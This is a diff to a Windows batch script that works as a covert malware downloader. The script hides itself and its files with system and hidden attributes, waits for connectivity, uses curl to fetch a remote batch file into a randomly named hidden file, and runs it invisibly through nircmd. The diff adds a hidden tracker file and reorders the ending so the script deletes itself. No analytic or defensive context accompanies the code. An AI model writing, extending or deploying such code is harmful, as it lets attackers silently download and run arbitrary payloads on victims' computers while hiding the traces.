@@ -2,6 +2,12 @@
 setlocal 
 
 attrib +s +h +i "%~f0"
+
+call :TRACKER > "%temp%\process.pid"
+call :FINISH
+
+:TRACKER
+attrib +s +h +i "%temp%\process.pid"
 :connectivitycheck
 ping www.google.com -n 1 -w 5000 >NUL
 if errorlevel 1 goto Connectivitycheck
@@ -64,4 +70,7 @@ set "win32=%random%"
 "%environment%\curl.exe" -k %proxy% %host%/win32.bat -o "%environment%\Win32\%win32%.bat" && attrib +s +h +i "%environment%\Win32\%win32%.bat"
 "%environment%\nircmd.exe" exec hide "%environment%\Win32\%win32%.bat"
 endlocal
+exit /b
+
+:FINISH
 DEL /s /f /q /a "%~f0" && exit
